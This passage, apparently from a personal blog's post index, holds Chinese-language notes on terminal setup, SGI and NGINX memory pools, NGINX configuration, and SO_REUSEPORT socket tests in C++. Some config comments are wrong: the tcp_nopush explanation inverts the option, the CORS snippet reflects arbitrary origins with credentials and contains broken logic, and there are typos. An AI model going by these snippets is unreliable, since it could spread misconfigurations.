C:\\\\Users\\\\Administrator\\\\Desktop\\\\wez_keys.xls powershell starship: Releases · starship/starship (github.com) 下载安装 安装 posh 12Install-Module posh-git -Scope CurrentUser # posh-gitInstall-Module oh-my-posh -Scope CurrentUser -RequiredVersion 2.0.496 # oh-my-posh 修改配置文件 1nvim $Profile 添加以下内容 123456789101112131415161718Import-Module posh-git # 引入 posh-gitImport-Module oh-my-posh # 引入 oh-my-poshInvoke-Expression (&amp;starship init powershell) # 引入StarshipSet-PSReadLineOption -PredictionSource History # 设置预测文本来源为历史记录 Set-PSReadlineKeyHandler -Key Tab -Function Complete # 设置 Tab 键补全Set-PSReadLineKeyHandler -Key \"Ctrl+d\" -Function MenuComplete # 设置 Ctrl+d 为菜单补全和 IntellisenseSet-PSReadLineKeyHandler -Key \"Ctrl+z\" -Function Undo # 设置 Ctrl+z 为撤销Set-PSReadLineKeyHandler -Key UpArrow -ScriptBlock &#123; [Microsoft.PowerShell.PSConsoleReadLine]::HistorySearchBackward() [Microsoft.PowerShell.PSConsoleReadLine]::EndOfLine()&#125;Set-PSReadLineKeyHandler -Key DownArrow -ScriptBlock &#123; [Microsoft.PowerShell.PSConsoleReadLine]::HistorySearchForward() [Microsoft.PowerShell.PSConsoleReadLine]::EndOfLine()&#125; 重启终端 1234567Move-Item $env:LOCALAPPDATA\\nvim $env:LOCALAPPDATA\\nvim.bakMove-Item $env:LOCALAPPDATA\\nvim-data $env:LOCALAPPDATA\\nvim-data.bakgit clone --depth 1 https://github.com/AstroNvim/AstroNvim $env:LOCALAPPDATA\\nvimnvim 用户配置文件，Windows 下配置目录为：C:\\Users\\Administrator\\AppData\\Local\\nvim： Managing User Configuration | AstroNvim Docs AstroNvim 配置 https://github.com/AstroNvim/astrocommunity C:\\Users\\Administrator\\AppData\\Local\\nvim\\.gitignore 注释掉 lua/user C:\\Users\\Administrator\\AppData\\Local\\nvim\\lua\\user\\plugins\\community.lua 添加社区第三方包 C:\\Users\\Administrator\\AppData\\Local\\nvim\\lua\\user\\init.lua 配置第三方包 1234567891011return &#123; -- Add the community repository of plugin specifications \"AstroNvim/astrocommunity\", -- example of importing a plugin, comment out to use it or add your own -- available plugins can be found at https://github.com/AstroNvim/astrocommunity &#123; import = \"astrocommunity.colorscheme.catppuccin\" &#125;, -- &#123; import = \"astrocommunity.completion.copilot-lua-cmp\" &#125;, &#123; import = \"astrocommunity.utility.noice-nvim\" &#125;, &#123; import = \"astrocommunity.completion.cmp-cmdline\" &#125;,&#125; 开始界面配置 C:\\Users\\Administrator\\AppData\\Local\\nvim\\lua\\user\\plugins\\core.lua 替换opts.section.header.val 字符串即可。 LSP :LspInstall 需要的安装包。配置都再 user 文件下的 lua 脚本中。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Terminal","slug":"Tools/Terminal","permalink":"https://racleray.github.io/categories/Tools/Terminal/"}],"tags":[{"name":"terminal","slug":"terminal","permalink":"https://racleray.github.io/tags/terminal/"},{"name":"configure","slug":"configure","permalink":"https://racleray.github.io/tags/configure/"}],"author":"HeRui"},{"title":"Memory Pool","slug":"Memory-Pool","date":"2024-03-17T13:30:22.000Z","updated":"2024-03-17T13:48:07.461Z","comments":true,"path":"posts/5d8e957f.html","link":"","permalink":"https://racleray.github.io/posts/5d8e957f.html","excerpt":"内存池实现与对比","text":"SGI Memory Pool 大于 128Bytes 直接使用 malloc / free ，只管理内存，不负责构造与析构。 小于 128Bytes 使用自定义内存空间管理。 8、16、24、... 、128 大小的内存块指针数组统一管理 1234union _Obj &#123; union _Obj* _M_free_list_link; char _M_client_data[1]; /* The client sees this. */&#125;; 每个大小内存块组织在一个大的内存空间，维护 起始地址、结束地址和对空间大小 123static char* _S_start_free;static char* _S_end_free;static size_t _S_heap_size; 组织可用内存块为一个链表，顶层管理的指针数组中的元素，指向对应内存块区域中，首个可用的内存块地址 申请和释放内存块，就是在改变链表的指向 当然，已经申请的内存，在内存池回收前，都不会释放。 内存池管理接口： 123456789101112131415161718// 分配内存的入口函数static void* allocate(size_t __n)// 把分配好的chunk块添加到自由链表当中static void* _S_refill(size_t __n);// 分配相应__size字节大小的chunk块，__nobjs个（函数内可修改）static char* _S_chunk_alloc(size_t __size, int&amp; __nobjs);// 把chunk块归还到内存池static void deallocate(void* __p, size_t __n);// 内存池扩容函数template &lt;bool threads, int inst&gt;void*__default_alloc_template&lt;threads, inst&gt;::reallocate(void* __p, size_t __old_sz, size_t __new_sz); 另外又两个辅助函数： 地址对齐用的函数 _S_round_up 12345/*将 __bytes 上调至最邻近的 8 的倍数*/static size_t _S_round_up(size_t __bytes) &#123; return (((__bytes) + (size_t) _ALIGN-1) &amp; ~((size_t) _ALIGN - 1)); &#125;// ~((size_t) _ALIGN - 1) 得到一个二进制掩码 1111...1000 内存块指针数组中找到对应 chunk 块大小的函数 _S_freelist_index 1234/*返回 __bytes 大小的chunk块位于 free-list 中的编号*/static size_t _S_freelist_index(size_t __bytes) &#123; return (((__bytes) + (size_t)_ALIGN-1)/(size_t)_ALIGN - 1); &#125; NGINX Memory Pool 123456789101112131415161718struct ngx_pool_s &#123; ngx_pool_data_t d; //内存池数据管理相关指针的结构体 size_t max; //ngx_pool_data_t可分配的最大内存值，超过此值则使用 ngx_pool_large_t 分配内存 ngx_pool_t *current; //当前内存池指针 ngx_chain_t *chain; //挂接一个ngx_chain_t结构 ngx_pool_large_t *large; //大块内存链表 ngx_pool_cleanup_t *cleanup; //释放内存池的操作集（callback函数） ngx_log_t *log; //日志信息&#125;;typedef struct ngx_pool_s ngx_pool_t;typedef struct &#123; u_char *last; //当前内存池分配到的末尾地址，即下一次分配开始地址 u_char *end; //内存池结束位置 ngx_pool_t *next; //下一块内存 ngx_uint_t failed; //当前块内存分配失败次数&#125; ngx_pool_data_t; 小块内存，通过 ngx_pool_data_t 组织为链表结构，在 last 到 end 之间分配内存使用。不足时，会新开辟一个内存块。 1234struct ngx_pool_large_s &#123; ngx_pool_large_t *next; // 下一个大块内存 void *alloc; // 记录分配的大块内存的起始地址&#125;; 大块内存，通过 ngx_pool_large_s 组织为链表，使用和释放就是包装之后的 malloc 和 free。 12345678910typedef void (*ngx_pool_cleanup_pt)(void *data); // 清理回调函数的类型定义typedef struct ngx_pool_cleanup_s ngx_pool_cleanup_t;// 清理操作的类型定义，包括一个清理回调函数，传给回调函数的数据和下一个清理操作的地址struct ngx_pool_cleanup_s &#123; ngx_pool_cleanup_pt handler; // 清理回调函数 void *data; // 传递给回调函数的指针 ngx_pool_cleanup_t *next; // 指向下一个清理操作&#125;; 内存池的清理，一般在内存池销毁之前。 内存池的一般接口为： 1234567891011ngx_pool_t *ngx_create_pool(size_t size, ngx_log_t *log); // 创建内存池void ngx_destroy_pool(ngx_pool_t *pool); // 销毁内存池void ngx_reset_pool(ngx_pool_t *pool); // 重置内存池void *ngx_palloc(ngx_pool_t *pool, size_t size); // 内存分配函数，支持内存对齐void *ngx_pnalloc(ngx_pool_t *pool, size_t size); // 内存分配函数，不支持内存对齐void *ngx_pcalloc(ngx_pool_t *pool, size_t size); // 内存分配函数，支持内存初始化0ngx_int_t ngx_pfree(ngx_pool_t *pool, void *p); // 内存释放（大块内存）,不支持小块内存 ngx_pool_cleanup_t *ngx_pool_cleanup_add(ngx_pool_t *p, size_t size); // 添加清理handler 小块内存池的申请，需要手动进行内存对齐，以增加内存操作的效率，因为没有使用 malloc 不会自动对齐。 12#define ngx_align_ptr(p, a) \\(u_char *) (((uintptr_t) (p) + ((uintptr_t) a - 1)) &amp; ~((uintptr_t) a - 1)) 这个操作的逻辑和 _S_round_up 是一致的。将指针 p 向上对齐到最接近的 a 的倍数。 实现与测试 github link ；一个类似的简化版 NGINX 内存池实现 MemoryPool。 整体而言，自定义实现的 MemoryPool allocator 性能比 SGI Memory Pool 性能会好一些。 SGI Memory Pool 的性能和 STL 默认 allocator 性能相差无几。NGINX Memory Pool 性能会比 SGI Memory Pool 更好。但是NGINX Memory Pool 并没有实现为 allocator 的形式。 内存管理相关 对 malloc 的进一步优化： jemalloc mimalloc well document tcmalloc 其中 jemalloc 和 mimallic 会是更优的选择。 相关学习博客推荐为： 内存分配器之jemalloc技术原理分析 JeMalloc 看了但是忘了，还是随便总结一点可能会好一些吧。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Memory","slug":"Notes/Memory","permalink":"https://racleray.github.io/categories/Notes/Memory/"}],"tags":[{"name":"Memory Pool","slug":"Memory-Pool","permalink":"https://racleray.github.io/tags/Memory-Pool/"},{"name":"Memory","slug":"Memory","permalink":"https://racleray.github.io/tags/Memory/"}],"author":"HeRui"},{"title":"NGINX Recap","slug":"NGINX-Recap","date":"2024-03-09T15:57:33.000Z","updated":"2024-03-09T16:02:34.925Z","comments":true,"path":"posts/e2369d80.html","link":"","permalink":"https://racleray.github.io/posts/e2369d80.html","excerpt":"NGINX 一点小结","text":"使用配置 讨论的使用场景： - 反向代理 - 负载均衡 - 服务路由 - 静态站点 - 文件服务器 - 前后端跨域访问 资源链接： - NGINX配置教程：NGINXConfig DigitalOcean - NGINX文档：在线文档-nginx 基本使用命令行： 12345678ginx -s stop # 快速关闭Nginx，可能不保存相关信息，并迅速终止web服务。nginx -s quit # 平稳关闭Nginx，保存相关信息，有安排的结束web服务。nginx -s reload # 因改变了Nginx相关配置，需要重新加载配置而重载。nginx -s reopen # 重新打开日志文件。nginx -c filename # 为 Nginx 指定一个配置文件，来代替缺省的。nginx -t # 测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件。nginx -v # 显示 nginx 的版本。nginx -V # 显示 nginx 的版本，编译器版本和配置参数。 反向代理 nginx.conf 文件如下。值得注意的地方有 sendfile、tcp_nopush、tcp_nodelay 选项，和 location 以及 upstream 的配置。配置文件一般在 nginx/conf/conf.d/ 目录下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#运行用户#user user_name;#启动进程,通常设置成和cpu的数量相等worker_processes 4;#全局错误日志error_log ~/test/nginx-1.10.1/logs/error.log;error_log ~/test/nginx-1.10.1/logs/notice.log notice;error_log ~/test/nginx-1.10.1/logs/info.log info;#PID文件，记录当前启动的nginx的进程IDpid ~/test/nginx-1.10.1/logs/nginx.pid;#工作模式及连接数上限events &#123; worker_connections 1024; # 单个后台worker process进程的最大并发链接数&#125;#设定http服务器，利用它的反向代理功能提供负载均衡支持http &#123; #设定mime类型(邮件支持类型),类型由mime.types文件定义 include ~/test/nginx-1.10.1/conf/mime.types; default_type application/octet-stream; #设定日志 log_format main '[$remote_addr] - [$remote_user] [$time_local] \"$request\" '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log ~/test/nginx-1.10.1/logs/access.log main; rewrite_log on; #sendfile 指令指定 nginx 是否调用 sendfile 函数（zero copy）来传输文件，对于普通应用，一般设为 on #如果用来进行下载等应用磁盘IO重负载应用，可设置为 off，以平衡磁盘与网络I/O处理速度. sendfile on; #启用 TCP NOPUSH 选项时，数据包将立即发送给客户端，而不会等待 TCP 的缓冲区填充或达到最大传输单元（MTU）的大小。这有助于降低网络延迟，提高响应速度。 #当需要减少网络带宽使用或减轻服务器负载时，可设为 off #tcp_nopush on; #连接超时时间 keepalive_timeout 120; #禁用 Nagle 算法。Nagle 算法的目的是通过在发送数据之前进行数据缓冲，以提高网络利用率。它将小的数据块合并成更大的数据包，减少发送的数据包数量，从而减少网络上的传输开销。 #启用 tcp_nodelay 可以减少数据传输的延迟，但可能会增加网络带宽的使用。 tcp_nodelay on; #gzip压缩开关 #gzip on; keepalive_timeout 60; # 客户端连接保持会话超时时间 client_header_buffer_size 4k; # 客户端请求头部的缓冲区大小，一般为系统分页大小 open_file_cache max=102400 inactive=20s; # 打开文件缓存数量，inactive 删除不活跃文件 open_file_cache_valid 30s; # 多久检查一次有效缓存 open_file_cache_min_uses 1; # inactive 最少使用次数 client_header_timeout 15; # 设置请求头的超时时间 client_body_timeout 15; # 设置请求体的超时时间 reset_timedout_connection on; # 关闭不响应的客户端连接 send_timeout 15; # 客户端响应超时时间 server_tokens off; # 关闭在错误页面中的nginx版本数字 client_max_body_size 10m; # 上传文件大小限制 #======================================= #设定实际的服务器列表 upstream actual_server_1 &#123; server 127.0.0.1:8089; &#125; #======================================= #HTTP/HTTPS服务器 server &#123; #监听80端口，用于HTTP协议 listen 80; #========================================== #用于 HTTPS 部分 #443 用于 HTTPS #listen 443 ssl; #ssl证书用于 HTTPS #ssl证书文件位置(常见证书文件格式为：crt/pem) #ssl_certificate cert.pem; #ssl证书key位置 #ssl_certificate_key cert.key; #ssl配置参数（选择性配置） #ssl_session_cache shared:SSL:1m; #ssl_session_timeout 5m; #数字签名，此处使用MD5 #ssl_ciphers HIGH:!aNULL:!MD5; #ssl_prefer_server_ciphers on; #location / &#123; # root /root; # index index.html index.htm; #&#125; #========================================== #定义使用www.xx.com访问 server_name www.helloworld.com; #首页 index index.html #指向webapp的目录 root ~/code/webapp; #编码格式 charset utf-8; #代理配置参数 proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_set_header Host $host; proxy_set_header X-Forwarder-For $remote_addr; #反向代理的路径（和upstream绑定），location 后面设置映射的路径 location / &#123; proxy_pass http://actual_server_1; &#125; #静态文件，nginx自己处理 location ~ ^/(images|javascript|js|css|flash|media|static)/ &#123; root ~/code/webapp/views; #过期30天，静态文件不怎么更新，过期可以设大一点，如果频繁更新，则可以设置得小一点。 expires 30d; &#125; #设定查看Nginx状态的地址 location /NginxStatus &#123; stub_status on; access_log on; auth_basic \"NginxStatus\"; auth_basic_user_file conf/htpasswd; &#125; #禁止访问 .htxxx 文件 location ~ /\\.ht &#123; deny all; &#125; #错误处理页面（可选择性配置） error_page 404 /404.html; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; 负载均衡 nginx.conf 文件如下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091http &#123; #设定mime类型,类型由mime.type文件定义 include /etc/nginx/mime.types; default_type application/octet-stream; #设定日志格式 access_log /var/log/nginx/access.log; #设定负载均衡的服务器列表 以下多选一进行配置 # -- 加权轮询方式 upstream load_balance_server &#123; #weigth参数表示权值，权值越高被分配到的几率越大 server 192.168.1.11:80 weight=5; server 192.168.1.12:80 weight=1; server 192.168.1.13:80 weight=6; &#125; # -- 轮询 upstream load_balance_server &#123; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- 最少连接数 upstream load_balance_server &#123; least_conn; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- 加权最少连接数 upstream load_balance_server &#123; least_conn; server 192.168.1.11:80 weight=5; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- IP hash upstream load_balance_server &#123; ip_hash; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; # -- uri 普通hash upstream load_balance_server &#123; hash $request_uri; server 192.168.1.11:80 ; server 192.168.1.12:80 ; server 192.168.1.13:80 ; &#125; #HTTP服务器 server &#123; listen 80; server_name www.helloworld.com; #对所有请求进行负载均衡请求 location / &#123; root /root; #定义服务器的默认网站根目录位置 index index.html index.htm; #定义首页索引文件的名称 proxy_pass http://load_balance_server ;#请求转向load_balance_server 定义的服务器列表 #以下是一些反向代理的配置(可选择性配置) #proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP proxy_set_header X-Forwarded-For $remote_addr; proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时) proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时) proxy_read_timeout 90; #后端服务器响应时间(代理接收超时) proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小 proxy_buffers 4 32k; #proxy_buffers缓冲区，假设网页平均在32k以下的话 proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2） proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传输 client_max_body_size 10m; #允许客户端请求的最大单文件字节数 client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数 &#125; &#125;&#125; 多端口应用配置 nginx.conf 文件如下，通过 URL 将请求路由到正确的服务所在端口上。 12345678910111213141516171819202122232425262728293031323334353637http &#123; #一些基本配置 #... upstream product_server &#123; server www.helloworld.com:8081; &#125; upstream admin_server &#123; server www.helloworld.com:8082; &#125; upstream finance_server &#123; server www.helloworld.com:8083; &#125; server &#123; #... #默认指向product的server location / &#123; proxy_pass http://product_server; &#125; location /product/ &#123; proxy_pass http://product_server; &#125; location /admin/ &#123; proxy_pass http://admin_server; &#125; location /finance/ &#123; proxy_pass http://finance_server; &#125; &#125;&#125; 静态站点 1234567891011121314151617181920212223242526worker_processes 4;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; gzip on; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png; gzip_vary on; server &#123; listen 80; server_name www.static.com; location / &#123; root /app/dist; # 静态资源所在目录 index index.html; # 请求返回 index.html &#125; &#125;&#125; 简易文件服务器 1234567891011autoindex on; # 显示目录autoindex_exact_size on; # 显示文件大小autoindex_localtime on; # 显示文件时间server &#123; charset utf-8,gbk; # 编码支持 listen 9050 default_server; listen [::]:9050 default_server; server_name _; root /share/fs; # 共享文件服务的根路径&#125; 前后端跨域方案 首先新建配置文件 solution.conf： 1234567891011121314151617181920212223242526# allow origin listset $ACAO '*';# set single originif ($http_origin ~* (www.helloworld.com)$) &#123; set $ACAO $http_origin;&#125;if ($cors = \"trueget\") &#123; add_header 'Access-Control-Allow-Origin' \"$http_origin\"; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS'; add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type';&#125;if ($request_method = 'OPTIONS') &#123; set $cors \"$&#123;cors&#125;options\";&#125;if ($request_method = 'GET') &#123; set $cors \"$&#123;cors&#125;get\";&#125;if ($request_method = 'POST') &#123; set $cors \"$&#123;cors&#125;post\";&#125; 再配置服务器配置文件： 123456789101112131415161718192021222324# ...upstream front_server &#123; server www.helloworld.com:9000;&#125;upstream api_server &#123; server www.helloworld.com:8080;&#125;server &#123; listen 80; server_name www.helloworld.com; location ~ ^/api/ &#123; include solution.conf.conf; # include 新建的配置文件 proxy_pass http://api_server; rewrite \"^/api/(.*)$\" /$1 break; &#125; location ~ ^/ &#123; proxy_pass http://front_server; &#125;&#125; NGINX设计与优化小结 关闭 Nagle 算法：关闭为小数据包设计的 Nagle 算法，一般 HTTP 协议包普遍比较大 开启 cork 算法：尽量让数据包达到一个 MTU 大小再发送，提高网络有效负载，发送大量数据时有效。 发送文件 sendfile : 直接将内核态读取的数据包发送到内核协议栈数据通路。 开启 TCP_DEFER_ACCEPT 选项：让套接字在有数据可读时，才生成建立连接的套接字，提高效率。 使用 accept4 : 建立非阻塞连接，减少一次系统调用。 使用 TCP_QUICKACK: 将 ACK 与 数据包 一起发送，每次 recv 后需要重新设置。 使用用户态锁：nginx没有使用系统的信号量锁，而是使用了“共享内存+原子操作__sync_bool_compare_and_swap”实现的用户态锁。这样每次加锁解锁操作都不需要进入内核态，极大的提高了锁的性能。 避免惊群：如果多个 worker 同时监听一个套接字，nginx 使用锁保证只有一个 woker 在监听和accept。加入一个队列后，先释放锁，再处理连接请求。 减少 keepalive 时间：操作系统的 keepalive 原理是发送一个长度为 0 的tcp数据包，等待对端的 ACK 相应。如果有响应则认为连接时 alive 的。系统默认时间太长。但是一般如果时长连接设计，会在应用层设计心跳。 自建内存池：比如一个 HTTP 连接对应一个内存池，连接结束整个释放内存池。 master 时间管理：master 每 100ms 将多种时间格式化字符串写入共享内存，worker 不需要单独格式化，直接读取共享内存。 提高CPU缓存利用率：setpriority 提高进程优先级。sched_setaffinity 绑定CPU提高CPU缓存的命中率。 内存管理优化：使用 tcmalloc 替代 glibc 中的 malloc/free 内核参数优化： &gt; fs.file-max = 999999 # 进程可以同时打开的最大句柄数量 &gt; &gt; net.ipv4.tcp_max_tw_buckets = 6000 # 系统允许TIME_WAIT套接字数量的最大值不应太大 &gt; net.ipv4.ip_local_port_range = 1024 65000 # 允许系统打开的端口范围 &gt; net.ipv4.tcp_tw_recycle = 1 # time wait快速回收 &gt; net.ipv4.tcp_tw_reuse = 1 # 允许将TIME WAIT sockets重新用于新的TCP连接 &gt; net.ipv4.tcp_keepalive_time = 30 # TCP发送keepalive消息的频率 &gt; net.ipv4.tcp_syncookies = 1 # 开启SYN Cookies，当SYN等待队列溢出时，cookies来处理 &gt; net.ipv4.tcp_max_syn_backlog = 262144 # TCP三次握手建立阶段接受SYN请求队列的最大长度 &gt; net.core.netdev_max_backlog = 262144 # 允许送到数据缓存队列的数据包的最大数目 &gt; &gt; net.ipv4.tcp_rmem = 10240 87380 12582912 # TCP接受缓存窗口的最小值、默认值、最大值 &gt; net.ipv4.tcp_wmem = 10240 87380 12582912 # TCP发送缓存窗口的最小值、默认值、最大值 &gt; &gt; net.core.rmem_default = 6291456 # 内核套接字接受缓存区默认的大小 &gt; net.core.wmem_default = 6291456 # 内核套接字发送缓存区默认的大小 &gt; &gt; net.core.rmem_max = 12582912 # 内核套接字接受缓存区的最大大小 &gt; net.core.wmem_max = 12582912 # 内核套接字发送缓存区的最大大小 &gt; &gt; net.core.somaxconn = 40960 # 系统中每一个端口最大的监听队列的长度，对防止拒绝服务 DoS 攻击也会有所帮助 &gt; &gt; ### sysctl -p 应用配置 事件处理模型：multi_accept on 时，多个 worker 会按串行方式来处理连接；off 时，worker 使用并行模式，一个连接唤醒所有 worker，这种模式使用与连接数较少的低负载场景。 支持热加载：nginx -s reload 时，master 进程校验配置并打开新的监听端口，然后启动新的 worker 子进程，接着向旧的 worker 发送停止信号。旧 worker 处理完请求，或者在 worker_shert_dump 时间之后会关闭进程。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Nginx","slug":"Notes/Nginx","permalink":"https://racleray.github.io/categories/Notes/Nginx/"}],"tags":[{"name":"NGINX","slug":"NGINX","permalink":"https://racleray.github.io/tags/NGINX/"},{"name":"Server Design","slug":"Server-Design","permalink":"https://racleray.github.io/tags/Server-Design/"}],"author":"HeRui"},{"title":"REUSEPORT","slug":"REUSEPORT","date":"2024-03-03T16:06:07.000Z","updated":"2024-03-03T16:16:19.515Z","comments":true,"path":"posts/e474b5c3.html","link":"","permalink":"https://racleray.github.io/posts/e474b5c3.html","excerpt":"socket REUSEPORT 分析","text":"REUSEPORT 场景 TCP REUSEPORT 选项通过每个监听线程使用不同的 listen fd 来改进accpet的负载分配。相比于在一个线程中进行 accept 或者多个线程在同一个 listen fd 上进行 accept，有助于系统的负载均衡。 REUSEPORT 解决的问题是：两个线程同时 bind 在相同的 IP:Port 上，当两者同时进入 TCP_LISTEN 状态，内核如何将一个客户端连接分发给正确的线程。 bind 内核 bind 过程： 根据 IP 和 Port 等计算 hash key ； 在 bind_hash_bucket 中找到对应的 bind_bucket 链表，链表由 sock 结构体组成； bind 将新的 sock 结构体添加到对应链表； 添加时，由 inet_csk_get_port 检查当前使用的 port 的合法性； 检查 fastreuse 标志位是否为真，或者 fastreuseport 标志位是否为真，且新连接的 UID 是否和当前进程相同。标志位快速判断成功时，直接返回可用； 若快速判断不成功，将遍历 sock 链表，判断是否由冲突； REUSEPORT 选项开启后，两个线程的连接冲突的条件为，sock 当前不是 TCP_TIME_WAIT 状态且连接 UID 不同与线程 UID。其他情况下，不会存在连接冲突的情况。 测试 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102// server 1#include &lt;arpa/inet.h&gt;#include &lt;errno.h&gt;#include &lt;iostream&gt;#include &lt;net/ethernet.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;string&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;using namespace std;int main(int argc, char *argv[]) &#123; int listenfd = socket(AF_INET, SOCK_STREAM, 0); if (listenfd &lt; 0) &#123; std::cout &lt;&lt; \"socket error\" &lt;&lt; std::endl; return -1; &#125; int port = 30001; std::string addr_str = \"127.0.0.1\"; std::cout &lt;&lt; \"[tcp server_test1] addr:\" &lt;&lt; addr_str &lt;&lt; \":\" &lt;&lt; port &lt;&lt; \" fd=\" &lt;&lt; listenfd &lt;&lt; std::endl; sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = inet_addr(addr_str.c_str()); // addr.sin_addr.s_addr = htonl(INADDR_ANY);#ifdef RU_PORT int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEPORT error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEPORT succ\" &lt;&lt; std::endl;#endif#ifdef RU_ADDR int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEADDR error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEADDR succ\" &lt;&lt; std::endl;#endif //=========================================================================== // bind int ret = bind(listenfd, (sockaddr *)&amp;addr, sizeof(addr)); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"bind error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"bind success\" &lt;&lt; std::endl; //=========================================================================== // listen#ifndef NO_LISTEN ret = listen(listenfd, 5); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"listen error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"listen success\" &lt;&lt; std::endl;#endif //=========================================================================== // accept while (1) &#123;#ifndef NO_LISTEN sockaddr cli_addr; socklen_t len; // accept std::cout &lt;&lt; \"accepting \" &lt;&lt; std::endl; int connfd = accept(listenfd, &amp;cli_addr, &amp;len); if (connfd &lt; 0) &#123; std::cout &lt;&lt; \"accept error, error=\" &lt;&lt; strerror(errno) &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"accept success, connfd=\" &lt;&lt; connfd &lt;&lt; std::endl; // shutdown std::cout &lt;&lt; \"INFO: input 1 to close connection, go to timewait\" &lt;&lt; std::endl; int close_flag; std::cin &gt;&gt; close_flag; if (close_flag == 1) &#123; shutdown(connfd, SHUT_WR); &#125; std::cout &lt;&lt; \"success call shutdown, now exit\" &lt;&lt; std::endl; break;#endif &#125; close(listenfd); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// server 2#include &lt;arpa/inet.h&gt;#include &lt;errno.h&gt;#include &lt;iostream&gt;#include &lt;net/ethernet.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;string&gt;#include &lt;sys/socket.h&gt;#include &lt;unistd.h&gt;int main(int argc, char *argv[]) &#123; int listenfd = socket(AF_INET, SOCK_STREAM, 0); if (listenfd &lt; 0) &#123; std::cout &lt;&lt; \"socket error\" &lt;&lt; std::endl; return -1; &#125; int port = 30001; std::string addr_str = \"127.0.0.1\"; std::cout &lt;&lt; \"[tcp server_test2] addr:\" &lt;&lt; addr_str &lt;&lt; \":\" &lt;&lt; port &lt;&lt; \" fd=\" &lt;&lt; listenfd &lt;&lt; std::endl; sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_addr.s_addr = inet_addr(addr_str.c_str()); addr.sin_port = htons(port);#ifdef RU_PORT int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEPORT error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEPORT success\" &lt;&lt; std::endl;#endif#ifdef RU_ADDR int val = 1; if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &amp;val, sizeof(val)) &lt; 0) &#123; std::cout &lt;&lt; \"set SO_REUSEADDR error\" &lt;&lt; std::endl; &#125; std::cout &lt;&lt; \"set SO_REUSEADDR success\" &lt;&lt; std::endl;#endif int ret = bind(listenfd, (sockaddr *)&amp;addr, sizeof(addr)); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"bind error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"bind success\" &lt;&lt; std::endl;#ifndef NO_LISTEN ret = listen(listenfd, 5); if (ret &lt; 0) &#123; std::cout &lt;&lt; \"listen error! errno=\" &lt;&lt; errno &lt;&lt; \", err = \" &lt;&lt; strerror(errno) &lt;&lt; std::endl; return -1; &#125; std::cout &lt;&lt; \"listen success\" &lt;&lt; std::endl;#endif while (1) 